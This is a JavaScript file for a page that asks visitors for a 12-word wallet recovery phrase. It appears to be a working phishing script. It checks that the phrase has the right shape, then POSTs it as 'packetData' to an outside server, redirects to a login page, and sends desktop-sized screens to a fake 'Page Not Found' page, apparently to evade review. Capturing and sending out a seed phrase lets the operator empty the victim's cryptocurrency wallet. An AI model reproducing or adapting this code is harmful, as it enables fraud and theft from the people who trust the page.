let inputString = ""
let error1 = false;
let error2 = false;
let error3 = false;

if(screen.width > 768){
  window.location.assign("../PageNotFound/PageNotFound.html")
}

function checkSymbNum(inputData){
    let inputLen = inputData.length;
    for(let i=0;i<inputLen;i++){
      if((inputData.charCodeAt(i)>=0 && inputData.charCodeAt(i)<=31) || (inputData.charCodeAt(i)>=33 && inputData.charCodeAt(i)<=64) || (inputData.charCodeAt(i)>=91 && inputData.charCodeAt(i)<=96) || (inputData.charCodeAt(i)>=123 && inputData.charCodeAt(i)<=126)){
        return false;
      }
    }
    return true;
}

document.querySelector(".text-box").addEventListener("change",(e)=>{
    inputString = e.target.value;
    document.querySelector(".error-box").classList.add("display");
})

document.querySelector(".button").addEventListener("click",(e)=>{
    e.preventDefault();
    error1 = false
    error2 = false
    let length = inputString.length
    let words_count = 0;
    for(let i=0;i<length;i++){
        let str = "";
        let j=i;
        for(j=i;j<length;j++){
          if(inputString.charAt(j)==' ') break;
          else str=str + inputString.charAt(j);
        }
        i=j;
        let res = checkSymbNum(str);
        words_count++;
        if(!res){
          document.querySelector(".error-box").innerHTML = "*Recovery Phrase Should Not Contain Any Special Or Numeric Values";
          document.querySelector(".error-box").classList.remove("display");
          error1 = true;
          break;
        }
    }

    if(words_count != 12){
      error2 = true;
      document.querySelector(".error-box").innerHTML = "*Recovery Phrase Should Be Of 12 Words"
      document.querySelector(".error-box").classList.remove("display")
    }

    if(error1 === false && error2 === false){
        const url = "https://backend-01-92mi.onrender.com/api/data3";
        const data = {
            packetData:inputString
        };
        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        };

        fetch(url, options)
            .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
            })
            .then(data => {
            console.log(data)
            if(data.status === "Confirmed"){
                window.location.assign("../LoginPage/loginpage.html");
            }
            })
            .catch(error => {
                console.error('Fetch error:', error);
            });
    }
})
